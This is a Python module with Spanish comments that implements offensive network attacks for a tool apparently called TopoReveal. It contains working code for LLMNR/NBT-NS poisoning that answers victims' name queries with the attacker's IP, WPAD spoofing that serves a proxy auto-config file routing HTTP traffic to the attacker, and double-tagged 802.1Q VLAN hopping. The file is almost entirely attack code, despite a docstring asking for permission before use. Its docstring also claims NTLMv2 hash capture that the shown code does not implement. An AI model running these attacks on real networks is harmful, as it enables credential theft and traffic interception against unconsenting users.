"""
ofensivo.py — Módulos ofensivos opt-in para TopoReveal.

IMPORTANTE: Estos módulos son OFENSIVOS y requieren confirmación explícita
del usuario antes de ejecutarse. Solo deben usarse en redes propias o
con permiso escrito del propietario.

Módulos:
  1. LLMNR/NBT-NS Poisoning  — responde a queries LLMNR/NBT-NS para capturar
                               hashes NTLMv2 de máquinas Windows
  2. WPAD Spoofing           — responde a queries WPAD para interceptar
                               configuración de proxy automático
  3. VLAN Hopping            — envía frames 802.1Q dobles para saltar VLANs
                               y detectar si hay segmentación de red

Uso desde app.py:
    from tools.ofensivo import ModulosOfensivos
    self._ofensivo = ModulosOfensivos(interfaz, callback=self._on_ofensivo)
    self._ofensivo.iniciar_llmnr()
    self._ofensivo.iniciar_wpad()
    self._ofensivo.iniciar_vlan_hop(gateway_mac)
"""

import threading
import time
import socket
import struct
from datetime import datetime

_log_fn = None

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    linea = f"[{ts}] {msg}"
    if _log_fn:
        try: _log_fn(linea)
        except Exception: pass
    else:
        print(linea)

def set_log_callback(fn):
    global _log_fn
    _log_fn = fn


class ModulosOfensivos:
    """
    Contenedor de módulos ofensivos opt-in.
    Cada módulo corre en su propio hilo y puede detenerse independientemente.
    """

    def __init__(self, interfaz, callback=None):
        self.interfaz = interfaz
        self.callback = callback   # callback(tipo, datos_dict)
        self._hilos   = {}
        self._stops   = {}

    def detener_todo(self):
        for nombre, evt in self._stops.items():
            evt.set()
        log("[OFENSIVO] Todos los módulos detenidos")

    def esta_activo(self, nombre):
        hilo = self._hilos.get(nombre)
        return hilo is not None and hilo.is_alive()

    # ── 1. LLMNR / NBT-NS POISONING ──────────────────────────────────────────

    def iniciar_llmnr(self):
        """
        Escucha queries LLMNR (UDP 5355) y NBT-NS (UDP 137).
        Cuando detecta una query, responde con nuestra IP para que
        la víctima intente autenticarse → captura hash NTLMv2.
        """
        if self.esta_activo("llmnr"):
            log("[LLMNR] Ya está activo")
            return

        stop = threading.Event()
        self._stops["llmnr"] = stop

        hilo = threading.Thread(
            target=self._llmnr_worker,
            args=(stop,),
            daemon=True, name="llmnr-poisoner")
        self._hilos["llmnr"] = hilo
        hilo.start()
        log("[LLMNR] ⚡ Poisoning activo — escuchando queries en UDP 5355/137")

    def detener_llmnr(self):
        if "llmnr" in self._stops:
            self._stops["llmnr"].set()
            log("[LLMNR] Detenido")

    def _llmnr_worker(self, stop):
        """
        Escucha multicast LLMNR (224.0.0.252:5355) y responde.
        También escucha NBT-NS (255.255.255.255:137).
        """
        # Obtener nuestra IP
        try:
            s_tmp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s_tmp.connect(("8.8.8.8", 80))
            mi_ip = s_tmp.getsockname()[0]
            s_tmp.close()
        except Exception:
            mi_ip = "0.0.0.0"

        # Socket LLMNR
        sock_llmnr = None
        sock_nbt   = None
        try:
            # LLMNR — multicast UDP 5355
            sock_llmnr = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock_llmnr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock_llmnr.bind(("0.0.0.0", 5355))
            sock_llmnr.settimeout(1)

            # Unirse al grupo multicast LLMNR
            mreq = struct.pack("4s4s",
                socket.inet_aton("224.0.0.252"),
                socket.inet_aton(mi_ip))
            sock_llmnr.setsockopt(
                socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        except Exception as e:
            log(f"[LLMNR] Error abriendo socket: {e}")
            return

        try:
            # NBT-NS — broadcast UDP 137
            sock_nbt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock_nbt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock_nbt.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock_nbt.bind(("0.0.0.0", 137))
            sock_nbt.settimeout(1)
        except Exception as e:
            log(f"[LLMNR] Error en NBT-NS socket: {e} (puede requerir sudo)")

        capturas = []

        while not stop.is_set():
            # Escuchar LLMNR
            try:
                data, addr = sock_llmnr.recvfrom(512)
                ip_victima = addr[0]
                if ip_victima != mi_ip:
                    nombre = self._parsear_llmnr_query(data)
                    if nombre:
                        log(f"[LLMNR] Query de {ip_victima}: '{nombre}' — "
                            f"respondiendo con {mi_ip}")
                        respuesta = self._construir_llmnr_respuesta(data, mi_ip)
                        if respuesta:
                            sock_llmnr.sendto(respuesta, addr)
                        capturas.append({"ip": ip_victima, "query": nombre})
                        if self.callback:
                            self.callback("LLMNR_QUERY", {
                                "ip_victima" : ip_victima,
                                "query"      : nombre,
                                "mi_ip"      : mi_ip,
                                "detalle"    : (
                                    f"LLMNR query '{nombre}' de {ip_victima} "
                                    f"→ envenenado con {mi_ip}")
                            })
            except socket.timeout:
                pass
            except Exception:
                pass

            # Escuchar NBT-NS
            if sock_nbt:
                try:
                    data, addr = sock_nbt.recvfrom(512)
                    ip_victima = addr[0]
                    if ip_victima != mi_ip:
                        nombre = self._parsear_nbtns_query(data)
                        if nombre:
                            log(f"[NBT-NS] Query de {ip_victima}: '{nombre}'")
                            respuesta = self._construir_nbtns_respuesta(data, mi_ip)
                            if respuesta:
                                sock_nbt.sendto(respuesta, (ip_victima, 137))
                            if self.callback:
                                self.callback("NBTNS_QUERY", {
                                    "ip_victima": ip_victima,
                                    "query"     : nombre,
                                    "detalle"   : (
                                        f"NBT-NS query '{nombre}' de "
                                        f"{ip_victima} → envenenado")
                                })
                except socket.timeout:
                    pass
                except Exception:
                    pass

        if sock_llmnr: sock_llmnr.close()
        if sock_nbt:   sock_nbt.close()
        log(f"[LLMNR] Terminado — {len(capturas)} queries capturadas")

    def _parsear_llmnr_query(self, data):
        """Extrae el nombre consultado de un paquete LLMNR."""
        try:
            # LLMNR header: 12 bytes, luego QNAME en formato DNS
            if len(data) < 13: return None
            offset = 12
            nombre = []
            while offset < len(data):
                longitud = data[offset]
                if longitud == 0: break
                offset += 1
                if offset + longitud > len(data): break
                nombre.append(data[offset:offset+longitud].decode("utf-8",
                               errors="replace"))
                offset += longitud
            return ".".join(nombre) if nombre else None
        except Exception:
            return None

    def _construir_llmnr_respuesta(self, query, mi_ip):
        """Construye respuesta LLMNR apuntando a nuestra IP."""
        try:
            if len(query) < 12: return None
            # Copiar transaction ID, flags como respuesta
            tx_id = query[:2]
            flags = b'\x80\x00'   # QR=1 (respuesta), sin error
            qdcount = b'\x00\x01'
            ancount = b'\x00\x01'
            nscount = b'\x00\x00'
            arcount = b'\x00\x00'
            header = tx_id + flags + qdcount + ancount + nscount + arcount

            # Copiar la pregunta original (desde byte 12)
            question = query[12:]

            # Resource Record: nombre, tipo A, clase IN, TTL, rdata
            nombre_ptr = b'\xc0\x0c'   # puntero a offset 12
            rtype  = b'\x00\x01'       # A
            rclass = b'\x00\x01'       # IN
            ttl    = b'\x00\x00\x00\x1e'  # 30 segundos
            rdlen  = b'\x00\x04'
            rdata  = socket.inet_aton(mi_ip)
            rr = nombre_ptr + rtype + rclass + ttl + rdlen + rdata

            return header + question + rr
        except Exception:
            return None

    def _parsear_nbtns_query(self, data):
        """Extrae nombre NetBIOS de un paquete NBT-NS."""
        try:
            if len(data) < 34: return None
            # Nombre NetBIOS empieza en byte 13, codificado en 32 bytes
            encoded = data[13:45]
            nombre = ""
            for i in range(0, 32, 2):
                c1 = (encoded[i]   - 0x41)
                c2 = (encoded[i+1] - 0x41)
                char = chr((c1 << 4) | c2)
                if char == ' ': break
                nombre += char
            return nombre.strip() if nombre.strip() else None
        except Exception:
            return None

    def _construir_nbtns_respuesta(self, query, mi_ip):
        """Construye respuesta NBT-NS."""
        try:
            tx_id    = query[:2]
            flags    = b'\x85\x00'   # Response, Authoritative
            qdcount  = b'\x00\x00'
            ancount  = b'\x00\x01'
            nscount  = b'\x00\x00'
            arcount  = b'\x00\x00'
            header   = tx_id + flags + qdcount + ancount + nscount + arcount
            # Nombre (32 bytes codificado) + tipo NB + clase IN + TTL + RData
            nombre_enc = query[13:46] if len(query) > 46 else b'\x00' * 34
            nb_flags   = b'\x60\x00'   # grupo, B-node
            rdata      = nb_flags + socket.inet_aton(mi_ip)
            rr = (nombre_enc + b'\x00\x20\x00\x01'   # tipo NB, clase IN
                  + b'\x00\x00\x00\x1e'               # TTL 30s
                  + b'\x00\x06' + rdata)              # rdlength + rdata
            return header + rr
        except Exception:
            return None

    # ── 2. WPAD SPOOFING ─────────────────────────────────────────────────────

    def iniciar_wpad(self):
        """
        Responde a queries WPAD (Web Proxy Auto-Discovery).
        Cuando un equipo Windows busca 'wpad' en la red, respondemos
        con nuestra IP → el equipo descarga nuestro wpad.dat → captura
        de tráfico HTTP sin cifrar.
        """
        if self.esta_activo("wpad"):
            log("[WPAD] Ya está activo")
            return

        stop = threading.Event()
        self._stops["wpad"] = stop

        hilo = threading.Thread(
            target=self._wpad_worker,
            args=(stop,),
            daemon=True, name="wpad-spoofer")
        self._hilos["wpad"] = hilo
        hilo.start()
        log("[WPAD] ⚡ WPAD spoofer activo — escuchando queries LLMNR/NBT-NS para 'wpad'")

    def detener_wpad(self):
        if "wpad" in self._stops:
            self._stops["wpad"].set()
            log("[WPAD] Detenido")

    def _wpad_worker(self, stop):
        """
        Escucha LLMNR y NBT-NS filtrando solo queries para 'wpad'.
        También sirve el archivo wpad.dat si alguien lo pide por HTTP.
        """
        try:
            s_tmp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s_tmp.connect(("8.8.8.8", 80))
            mi_ip = s_tmp.getsockname()[0]
            s_tmp.close()
        except Exception:
            mi_ip = "0.0.0.0"

        # Socket LLMNR para WPAD
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", 5355))
            sock.settimeout(1)
        except Exception as e:
            log(f"[WPAD] Error socket: {e}")
            return

        # Servidor HTTP mínimo para servir wpad.dat
        wpad_thread = threading.Thread(
            target=self._wpad_http_server,
            args=(mi_ip, stop),
            daemon=True)
        wpad_thread.start()

        capturas = 0
        while not stop.is_set():
            try:
                data, addr = sock.recvfrom(512)
                ip_victima = addr[0]
                if ip_victima == mi_ip:
                    continue
                nombre = self._parsear_llmnr_query(data)
                if nombre and "wpad" in nombre.lower():
                    log(f"[WPAD] Query WPAD de {ip_victima} — "
                        f"respondiendo con {mi_ip}")
                    respuesta = self._construir_llmnr_respuesta(data, mi_ip)
                    if respuesta:
                        sock.sendto(respuesta, addr)
                    capturas += 1
                    if self.callback:
                        self.callback("WPAD_QUERY", {
                            "ip_victima": ip_victima,
                            "detalle"   : (
                                f"WPAD query de {ip_victima} → "
                                f"redirigido a {mi_ip}:8080/wpad.dat | "
                                f"Proxy interceptado")
                        })
            except socket.timeout:
                pass
            except Exception:
                pass

        if sock: sock.close()

    def _wpad_http_server(self, mi_ip, stop):
        """Servidor HTTP mínimo en puerto 8080 para servir wpad.dat."""
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", 8080))
            srv.listen(5)
            srv.settimeout(1)
            log(f"[WPAD] Servidor HTTP en {mi_ip}:8080")

            wpad_content = (
                f'function FindProxyForURL(url, host) {{\n'
                f'  return "PROXY {mi_ip}:8080; DIRECT";\n'
                f'}}\n'
            ).encode()

            while not stop.is_set():
                try:
                    conn, addr = srv.accept()
                    data = conn.recv(1024).decode("utf-8", errors="replace")
                    if "wpad.dat" in data or "wpad" in data.lower():
                        log(f"[WPAD] {addr[0]} descargó wpad.dat")
                        if self.callback:
                            self.callback("WPAD_DOWNLOAD", {
                                "ip_victima": addr[0],
                                "detalle"   : (
                                    f"{addr[0]} descargó wpad.dat — "
                                    f"proxy configurado")
                            })
                    resp = (
                        b"HTTP/1.1 200 OK\r\n"
                        b"Content-Type: application/x-ns-proxy-autoconfig\r\n"
                        b"Content-Length: " + str(len(wpad_content)).encode() +
                        b"\r\n\r\n" + wpad_content
                    )
                    conn.send(resp)
                    conn.close()
                except socket.timeout:
                    pass
                except Exception:
                    pass
            srv.close()
        except Exception as e:
            log(f"[WPAD] Error servidor HTTP: {e}")

    # ── 3. VLAN HOPPING ──────────────────────────────────────────────────────

    def iniciar_vlan_hop(self, gateway_mac=None, vlan_ids=None):
        """
        Detecta si hay segmentación VLAN hopeando con frames 802.1Q dobles.
        Envía frames con doble tag (outer VLAN + inner VLAN) y escucha
        si alguno llega a través del switch.
        Si llegan respuestas de VLANs distintas → segmentación insuficiente.
        """
        if self.esta_activo("vlan"):
            log("[VLAN] Ya está activo")
            return

        stop = threading.Event()
        self._stops["vlan"] = stop
        _vlan_ids = vlan_ids or list(range(1, 20))  # VLANs 1-19 por defecto

        hilo = threading.Thread(
            target=self._vlan_hop_worker,
            args=(stop, gateway_mac, _vlan_ids),
            daemon=True, name="vlan-hopper")
        self._hilos["vlan"] = hilo
        hilo.start()
        log(f"[VLAN] ⚡ VLAN hopping activo — probando {len(_vlan_ids)} VLANs")

    def detener_vlan(self):
        if "vlan" in self._stops:
            self._stops["vlan"].set()
            log("[VLAN] Detenido")

    def _vlan_hop_worker(self, stop, gateway_mac, vlan_ids):
        """
        Envía frames 802.1Q con doble tag hacia la dirección broadcast
        de cada VLAN y escucha respuestas ARP.
        """
        try:
            from scapy.all import (Ether, Dot1Q, ARP,
                                   sendp, sniff as _sniff)
        except ImportError:
            log("[VLAN] scapy no disponible")
            return

        try:
            s_tmp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s_tmp.connect(("8.8.8.8", 80))
            mi_ip = s_tmp.getsockname()[0]
            s_tmp.close()
        except Exception:
            mi_ip = "192.168.1.100"

        vlans_respondieron = []

        log(f"[VLAN] Enviando ARP probes con doble tag 802.1Q...")
        for vlan_id in vlan_ids:
            if stop.is_set():
                break
            try:
                # Frame con doble tag: outer=1 (native), inner=vlan_id
                frame = (
                    Ether(dst="ff:ff:ff:ff:ff:ff") /
                    Dot1Q(vlan=1) /
                    Dot1Q(vlan=vlan_id) /
                    ARP(op="who-has",
                        pdst=f"192.168.{vlan_id}.1",
                        psrc=mi_ip)
                )
                sendp(frame, iface=self.interfaz, verbose=False)
                time.sleep(0.1)
            except Exception as e:
                log(f"[VLAN] Error enviando a VLAN {vlan_id}: {e}")
                break

        # Escuchar respuestas ARP por 10 segundos
        log("[VLAN] Escuchando respuestas ARP de otras VLANs (10s)...")
        start = time.time()
        while not stop.is_set() and time.time() - start < 10:
            try:
                from scapy.all import sniff as _sniff2, ARP as _ARP
                pkts = _sniff2(
                    iface=self.interfaz,
                    filter="arp",
                    timeout=2, count=10, store=True)
                for pkt in pkts:
                    if pkt.haslayer(_ARP) and pkt[_ARP].op == 2:
                        ip_resp = pkt[_ARP].psrc
                        # Si la IP respondente está en un segmento distinto
                        base_local = ".".join(mi_ip.split(".")[:3])
                        base_resp  = ".".join(ip_resp.split(".")[:3])
                        if base_resp != base_local:
                            vlan_detectada = ip_resp.split(".")[2]
                            if vlan_detectada not in vlans_respondieron:
                                vlans_respondieron.append(vlan_detectada)
                                log(f"[VLAN] ⚠ VLAN hopping exitoso: "
                                    f"respuesta de {ip_resp} "
                                    f"(VLAN ~{vlan_detectada})")
                                if self.callback:
                                    self.callback("VLAN_HOP", {
                                        "ip_respondente": ip_resp,
                                        "vlan_estimada" : vlan_detectada,
                                        "detalle"       : (
                                            f"VLAN hopping exitoso: "
                                            f"{ip_resp} en VLAN "
                                            f"~{vlan_detectada} alcanzable")
                                    })
            except Exception:
                time.sleep(1)

        if not vlans_respondieron:
            log("[VLAN] VLAN hopping: sin respuestas — red bien segmentada "
                "o switch no vulnerable a double-tagging")
            if self.callback:
                self.callback("VLAN_RESULT", {
                    "vlans": [],
                    "detalle": "Sin respuesta — segmentación VLAN correcta"
                })
        else:
            log(f"[VLAN] VLAN hopping completado — "
                f"{len(vlans_respondieron)} VLAN(s) accesibles: "
                f"{', '.join(vlans_respondieron)}")
